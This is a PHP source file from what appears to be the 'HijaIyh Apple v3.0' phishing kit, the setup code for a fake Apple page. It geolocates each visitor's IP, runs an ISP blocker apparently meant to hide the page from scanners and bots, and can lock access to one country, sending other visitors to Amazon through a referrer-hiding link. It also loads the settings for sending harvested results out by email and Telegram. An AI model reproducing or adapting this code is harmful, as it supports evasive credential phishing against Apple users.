<?php
# HijaIyh Project.
/**
* HijaIyh Apple v3.0
* @version 3.0
* @author shutdown57 < indonesianpeople.shutdown57@gmail.com >
* @copyright (c) HijaIyh Production 2019.
**/

$sfile = __DIR__.'/config/scama.iyh.json';
$rfile = __DIR__.'/config/result.iyh.json';
$dotStatus = __DIR__.'/config/.status_hijaiyh';

if(!file_exists($dotStatus) || file_exists($dotStatus) && file_get_contents($dotStatus) != 'active')
{
	require_once(__DIR__.'/__init__HIJAIYH3.php');exit;
}

/*if($api->config()['status'] != 'live'){

	require_once(__DIR__.'/__init__HIJAIYH3.php');exit;
}*/
$lc['ip'] = $core->userIP();
$lc['country'] = $api->country($lc['ip']);
$lc['countryCode'] = $api->countrycode($lc['ip']);
$lc['isp'] = $api->isp($lc['ip']);

$blocker->run_blocker($lc['isp']/*,array($API_URL, file_get_contents(__DIR__.'/config/.account_key'),@file_get_contents(__DIR__.'/config/.api_key'))*/);

$core->create_session(['country_' => $lc['country']]);

if($core->parse_hijaiyh('lc','lock_lang') == 1)
{
	$lc['lang'] = $core->parse_hijaiyh('lc','default_lang');
}else{
	$lc['lang'] = $locales->langcountry($lc['countryCode']);
}

if($core->parse_hijaiyh('lc','lock_country') == 1)
{
	if(strtolower($lc['countryCode']) != strtolower($core->parse_hijaiyh('lc','allowed_country')))
	{
		$core->stats('bot','Country blacklisted because lock country ('.$core->parse_hijaiyh('lc','allowed_country').') active | '.$lc['countryCode']);
		$core->redirect('https://href.li?https://amazon.com');
		exit;
	}
}

// aliases

$userIP = $lc['ip'];
$country_name = $lc['country'];

$locale =$lc['lang'].'_'.$lc['countryCode'];
$clang = explode("_",$locale);

$lang = @$clang[0];
$country_code = @$clang[1];
$localex = @$_GET['locale'];
// config result
$all_result = json_decode(@file_get_contents(__DIR__.'/config/result.iyh.json'),true);
$email_result = $all_result['result_email'];
$telegram_result = $all_result['result_telegram'];
